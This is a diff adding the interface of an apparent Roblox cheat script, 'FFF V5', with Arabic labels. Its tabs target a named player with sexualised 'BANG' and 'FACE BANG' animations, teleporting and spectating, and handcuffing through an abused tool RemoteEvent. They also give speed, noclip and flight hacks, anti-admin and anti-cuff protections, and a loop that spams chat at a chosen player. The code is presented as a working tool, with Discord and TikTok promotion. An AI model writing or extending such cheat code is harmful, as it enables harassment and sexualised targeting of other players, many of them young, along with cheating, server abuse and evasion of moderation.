+local pages, navButtons = {}, {}
+
+local function showTab(name)
+    for p, f in pairs(pages) do f.Visible = (p == name) end
+    for n, b in pairs(navButtons) do
+        b.BackgroundColor3 = (n == name) and C.text or C.panel2
+        b.TextColor3 = (n == name) and C.bg or C.textDim
+    end
+end
+
+for i, tab in ipairs(tabList) do
+    local btn = mkBtn(sidebar, tab.text, UDim2.fromOffset(5, 10 + (i-1)*45), UDim2.new(1, -10, 0, 35), C.panel2, C.textDim)
+    btn.TextSize = 12
+    navButtons[tab.name] = btn
+    local page = make("ScrollingFrame", {
+        Position = UDim2.fromOffset(130, 50), Size = UDim2.new(1, -140, 1, -60),
+        BackgroundColor3 = C.panel, BorderSizePixel = 0, ScrollBarThickness = 2,
+        ScrollBarImageColor3 = C.line, Visible = false, ZIndex = 3,
+        CanvasSize = UDim2.new(0, 0, 0, 0)
+    }, window)
+    round(page, 10); outline(page, C.line, 1)
+    pages[tab.name] = page
+    on(btn.MouseButton1Click:Connect(function() showTab(tab.name) end))
+end
+showTab("main")
+
+-- ============ MAIN ============
+local mainPage = pages["main"]
+label(mainPage, "فريق التطوير", UDim2.fromOffset(10, 10), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold, Enum.TextXAlignment.Left)
+
+local function devCard(name, user, y)
+    local card = make("Frame", {Position = UDim2.fromOffset(10, y), Size = UDim2.new(1, -20, 0, 70), BackgroundColor3 = C.panel2, ZIndex = 4}, mainPage)
+    round(card, 8)
+    local img = make("ImageLabel", {Position = UDim2.fromOffset(10, 10), Size = UDim2.fromOffset(50, 50), BackgroundColor3 = C.bg, ZIndex = 5}, card)
+    round(img, 25)
+    task.spawn(function()
+        local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(user) end)
+        if ok and id then img.Image = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150", id) end
+    end)
+    label(card, name, UDim2.fromOffset(70, 12), UDim2.new(1, -70, 0, 20), 15, C.text, Enum.Font.GothamBold, Enum.TextXAlignment.Left)
+    label(card, "@" .. user, UDim2.fromOffset(70, 35), UDim2.new(1, -70, 0, 20), 12, C.textDim, Enum.Font.Gotham, Enum.TextXAlignment.Left)
+end
+devCard("FFF", "Ffjjskw_5", 40)
+devCard("sukarza_305", "beengeneralbnn", 120)
+
+label(mainPage, "روابط التواصل", UDim2.fromOffset(10, 210), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold, Enum.TextXAlignment.Left)
+local dcBtn = mkBtn(mainPage, "سيرفر الديسكورد", UDim2.fromOffset(10, 240), UDim2.new(1, -20, 0, 40), C.panel2)
+on(dcBtn.MouseButton1Click:Connect(function()
+    pcall(function() setclipboard("https://discord.gg/WRs88vKN5") end)
+    dcBtn.Text = "✅ تم النسخ!"
+    task.delay(2, function() dcBtn.Text = "سيرفر الديسكورد" end)
+end))
+local ttBtn = mkBtn(mainPage, "حساب التيك توك", UDim2.fromOffset(10, 290), UDim2.new(1, -20, 0, 40), C.panel2)
+on(ttBtn.MouseButton1Click:Connect(function()
+    pcall(function() setclipboard("https://www.tiktok.com/@fff_script") end)
+    ttBtn.Text = "✅ تم النسخ!"
+    task.delay(2, function() ttBtn.Text = "حساب التيك توك" end)
+end))
+
+-- ============ TARGET ============
+local targetPage = pages["target"]
+label(targetPage, "الاستهداف", UDim2.fromOffset(10, 10), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold)
+local targetBox = mkBox(targetPage, "اسم اللاعب...", UDim2.fromOffset(10, 40), UDim2.new(1, -20, 0, 35))
+local bangBtn = mkBtn(targetPage, "BANG", UDim2.fromOffset(10, 85), UDim2.new(0.5, -15, 0, 40), C.bg)
+local faceBtn = mkBtn(targetPage, "FACE BANG", UDim2.new(0.5, 5, 0, 85), UDim2.new(0.5, -15, 0, 40), C.bg)
+local viewBtn = mkBtn(targetPage, "مشاهدة", UDim2.fromOffset(10, 135), UDim2.new(0.5, -15, 0, 40), C.bg)
+local tpBtn = mkBtn(targetPage, "انتقال", UDim2.new(0.5, 5, 0, 135), UDim2.new(0.5, -15, 0, 40), C.bg)
+local tStatus = label(targetPage, "الحالة: جاهز", UDim2.fromOffset(10, 190), UDim2.new(1, -20, 0, 20), 12, C.textDim, Enum.Font.Gotham)
+local stopBtn = mkBtn(targetPage, "إيقاف الكل", UDim2.fromOffset(10, 220), UDim2.new(1, -20, 0, 35), C.red, C.text)
+
+local function setStatus(txt, col)
+    tStatus.Text = "الحالة: " .. txt
+    tStatus.TextColor3 = col or C.text
+end
+
+on(bangBtn.MouseButton1Click:Connect(function()
+    local p = getPlayer(targetBox.Text)
+    if p then startBang(p); setStatus("BANG -> " .. p.Name, C.green)
+    else setStatus("اللاعب غير موجود!", C.red) end
+end))
+on(faceBtn.MouseButton1Click:Connect(function()
+    local p = getPlayer(targetBox.Text)
+    if p then startFaceBang(p); setStatus("FACE BANG -> " .. p.Name, C.green)
+    else setStatus("اللاعب غير موجود!", C.red) end
+end))
+on(viewBtn.MouseButton1Click:Connect(function()
+    local p = getPlayer(targetBox.Text)
+    if p then
+        local hum = getHum(p)
+        if hum then workspace.CurrentCamera.CameraSubject = hum; setStatus("مشاهدة " .. p.Name, C.green) end
+    else setStatus("اللاعب غير موجود!", C.red) end
+end))
+on(tpBtn.MouseButton1Click:Connect(function()
+    local p = getPlayer(targetBox.Text)
+    if p then
+        local tr = getRoot(p); local mr = getRoot(LP)
+        if tr and mr then mr.CFrame = tr.CFrame; setStatus("تم الانتقال إلى " .. p.Name, C.green) end
+    else setStatus("اللاعب غير موجود!", C.red) end
+end))
+on(stopBtn.MouseButton1Click:Connect(function()
+    stopBang()
+    local hum = getHum(LP)
+    if hum then workspace.CurrentCamera.CameraSubject = hum end
+    setStatus("جاهز", C.textDim)
+end))
+
+-- ============ MOVE ============
+local movePage = pages["move"]
+label(movePage, "الحركة", UDim2.fromOffset(10, 10), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold)
+
+label(movePage, "السرعة:", UDim2.fromOffset(10, 40), UDim2.new(0.4, -10, 0, 30), 13, C.text, Enum.Font.GothamBold, Enum.TextXAlignment.Left)
+local speedBox = mkBox(movePage, "16", UDim2.new(0.4, 5, 0, 40), UDim2.new(0.6, -15, 0, 30))
+local speedBtn = mkBtn(movePage, "تطبيق", UDim2.fromOffset(10, 75), UDim2.new(1, -20, 0, 30), C.panel2)
+on(speedBtn.MouseButton1Click:Connect(function() setSpeed(speedBox.Text) end))
+
+label(movePage, "القفز:", UDim2.fromOffset(10, 115), UDim2.new(0.4, -10, 0, 30), 13, C.text, Enum.Font.GothamBold, Enum.TextXAlignment.Left)
+local jumpBox = mkBox(movePage, "50", UDim2.new(0.4, 5, 0, 115), UDim2.new(0.6, -15, 0, 30))
+local jumpBtn = mkBtn(movePage, "تطبيق", UDim2.fromOffset(10, 150), UDim2.new(1, -20, 0, 30), C.panel2)
+on(jumpBtn.MouseButton1Click:Connect(function() setJump(jumpBox.Text) end))
+
+local noclipBtn = mkBtn(movePage, "اختراق الجدران: ❌", UDim2.fromOffset(10, 195), UDim2.new(1, -20, 0, 35), C.panel2)
+local noclipOn = false
+on(noclipBtn.MouseButton1Click:Connect(function()
+    noclipOn = not noclipOn
+    toggleNoclip(noclipOn)
+    noclipBtn.Text = "اختراق الجدران: " .. (noclipOn and "✅" or "❌")
+    noclipBtn.BackgroundColor3 = noclipOn and C.green or C.panel2
+    noclipBtn.TextColor3 = noclipOn and C.bg or C.text
+end))
+
+local flyBtn = mkBtn(movePage, "طيران: ❌", UDim2.fromOffset(10, 240), UDim2.new(1, -20, 0, 35), C.panel2)
+local flyOn = false
+on(flyBtn.MouseButton1Click:Connect(function()
+    flyOn = not flyOn
+    toggleFly(flyOn)
+    flyBtn.Text = "طيران: " .. (flyOn and "✅" or "❌")
+    flyBtn.BackgroundColor3 = flyOn and C.green or C.panel2
+    flyBtn.TextColor3 = flyOn and C.bg or C.text
+end))
+
+label(movePage, "WASD للحركة | Space صعود | Ctrl هبوط", UDim2.fromOffset(10, 285), UDim2.new(1, -20, 0, 40), 11, C.textDim, Enum.Font.Gotham).TextWrapped = true
+
+-- ============ CUFF ============
+local cuffPage = pages["cuff"]
+label(cuffPage, "الكلبشة", UDim2.fromOffset(10, 10), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold)
+local cuffBox = mkBox(cuffPage, "اسم اللاعب...", UDim2.fromOffset(10, 40), UDim2.new(1, -20, 0, 35))
+local cuffBtn = mkBtn(cuffPage, "كلبشة اللاعب", UDim2.fromOffset(10, 85), UDim2.new(1, -20, 0, 40), C.bg)
+local cuffStatus = label(cuffPage, "الحالة: جاهز", UDim2.fromOffset(10, 135), UDim2.new(1, -20, 0, 20), 12, C.textDim, Enum.Font.Gotham)
+
+on(cuffBtn.MouseButton1Click:Connect(function()
+    local t = getPlayer(cuffBox.Text)
+    if not t or not t.Character then
+        cuffStatus.Text = "الحالة: اللاعب غير موجود!"; cuffStatus.TextColor3 = C.red; return
+    end
+    local tool = findCuffTool(LP.Character) or findCuffTool(LP.Backpack)
+    if not tool then
+        cuffStatus.Text = "الحالة: لا تملك أداة كلبشة!"; cuffStatus.TextColor3 = C.red; return
+    end
+    local remote = tool:FindFirstChildWhichIsA("RemoteEvent")
+    if not remote then
+        cuffStatus.Text = "الحالة: الأداة لا تحتوي RemoteEvent!"; cuffStatus.TextColor3 = C.red; return
+    end
+    local old = tool.Parent
+    tool.Parent = LP.Character
+    task.wait(0.05)
+    pcall(function() remote:FireServer(t.Character) end)
+    task.wait(0.05)
+    pcall(function() if tool and tool.Parent then tool.Parent = old end end)
+    cuffStatus.Text = "الحالة: تم محاولة كلبشة " .. t.Name
+    cuffStatus.TextColor3 = C.green
+end))
+
+-- ============ PROTECT ============
+local protPage = pages["protect"]
+label(protPage, "الحمايات", UDim2.fromOffset(10, 10), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold)
+
+local function toggleBtn(parent, name, y, callback)
+    local btn = mkBtn(parent, name .. ": ❌", UDim2.fromOffset(10, y), UDim2.new(1, -20, 0, 35), C.panel2)
+    local state = false
+    on(btn.MouseButton1Click:Connect(function()
+        state = not state
+        callback(state)
+        btn.Text = name .. ": " .. (state and "✅" or "❌")
+        btn.BackgroundColor3 = state and C.green or C.panel2
+        btn.TextColor3 = state and C.bg or C.text
+    end))
+    return btn
+end
+
+toggleBtn(protPage, "حماية الآدمن", 40, toggleSH)
+toggleBtn(protPage, "إخفاء رسائل السبام", 85, toggleSHSpam)
+toggleBtn(protPage, "مضاد التعليق", 130, toggleAntiSit)
+toggleBtn(protPage, "مضاد الكلبشة", 175, toggleAntiCuff)
+toggleBtn(protPage, "مضاد AFK (يمشي/ينط)", 220, toggleAntiAfk)
+toggleBtn(protPage, "مضاد Void", 265, toggleAntiVoid)
+
+-- ============ VOID ============
+local voidPage = pages["void"]
+label(voidPage, "الانتقال للفضاء", UDim2.fromOffset(10, 10), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold)
+local voidBtn = mkBtn(voidPage, "تفعيل (3 ثواني)", UDim2.fromOffset(10, 45), UDim2.new(1, -20, 0, 45), C.bg)
+on(voidBtn.MouseButton1Click:Connect(function()
+    doVoid()
+    voidBtn.Text = "جاري العودة بعد 3 ثواني..."
+    task.delay(3, function() voidBtn.Text = "تفعيل (3 ثواني)" end)
+end))
+
+-- ============ SPAM ============
+local spamPage = pages["spam"]
+label(spamPage, "السبام", UDim2.fromOffset(10, 10), UDim2.new(1, -20, 0, 20), 16, C.text, Enum.Font.GothamBold)
+
+local spamTarget = mkBox(spamPage, "اسم اللاعب", UDim2.fromOffset(10, 40), UDim2.new(0.4, -8, 0, 35))
+local spamSpeed = mkBox(spamPage, "1.5", UDim2.new(0.4, 8, 0, 40), UDim2.new(0.3, -8, 0, 35))
+spamSpeed.Text = "1.5"
+local spamType = mkBtn(spamPage, "النوع: الاثنين", UDim2.new(0.7, 8, 0, 40), UDim2.new(0.3, -8, 0, 35), C.bg)
+local spamMode = "both"
+on(spamType.MouseButton1Click:Connect(function()
+    if spamMode == "both" then spamMode = "chat"; spamType.Text = "النوع: شات"
+    elseif spamMode == "chat" then spamMode = "hidden"; spamType.Text = "النوع: مخفي"
+    else spamMode = "both"; spamType.Text = "النوع: الاثنين" end
+end))
+
+local spamBox = mkBox(spamPage, "النص هنا...", UDim2.fromOffset(10, 85), UDim2.new(1, -20, 0, 100))
+spamBox.MultiLine = true
+spamBox.TextWrapped = true
+
+local v1Btn = mkBtn(spamPage, "تعبئة v1", UDim2.fromOffset(10, 195), UDim2.new(0.33, -10, 0, 30), C.bg)
+local v2Btn = mkBtn(spamPage, "تعبئة v2", UDim2.new(0.33, 5, 0, 195), UDim2.new(0.33, -10, 0, 30), C.bg)
+local sendBtn = mkBtn(spamPage, "بدء الإرسال", UDim2.new(0.66, 5, 0, 195), UDim2.new(0.34, -10, 0, 30), C.text, C.bg)
+
+on(v1Btn.MouseButton1Click:Connect(function() spamBox.Text = SPAM_V1 end))
+on(v2Btn.MouseButton1Click:Connect(function() spamBox.Text = SPAM_V2 end))
+
+on(sendBtn.MouseButton1Click:Connect(function()
+    spamActive = not spamActive
+    sendBtn.Text = spamActive and "إيقاف" or "بدء الإرسال"
+    sendBtn.BackgroundColor3 = spamActive and C.panel2 or C.text
+    sendBtn.TextColor3 = spamActive and C.text or C.bg
+    if not spamActive then return end
+
+    task.spawn(function()
+        while spamActive do
+            local raw = spamBox.Text
+            local tgt = spamTarget.Text
+            local final = raw
+            if tgt ~= "" and raw ~= "" then
+                local parts = string.split(raw, ";")
+                local newParts = {}
+                for _, part in ipairs(parts) do
+                    local trimmed = string.gsub(part, "^%s*(.-)%s*$", "%1")
+                    if trimmed ~= "" then table.insert(newParts, trimmed .. " " .. tgt) end
+                end
+                if #newParts > 0 then final = ";" .. table.concat(newParts, " ;") end
+            end
+            if spamMode == "chat" then sendChat(final)
+            elseif spamMode == "hidden" then sendHD(final)
+            else sendChat(final); sendHD(final) end
+            local delay = tonumber(spamSpeed.Text) or 1.5
+            task.wait(delay)
+        end
+    end)
+end))
+
+-- ============ CHARACTER RESET ============
+on(LP.CharacterAdded:Connect(function()
+    if bang.active then stopBang() end
+end))
+
+print("[FFF V5] Loaded! Face Bang + AFK (walk/jump/move) ✅")
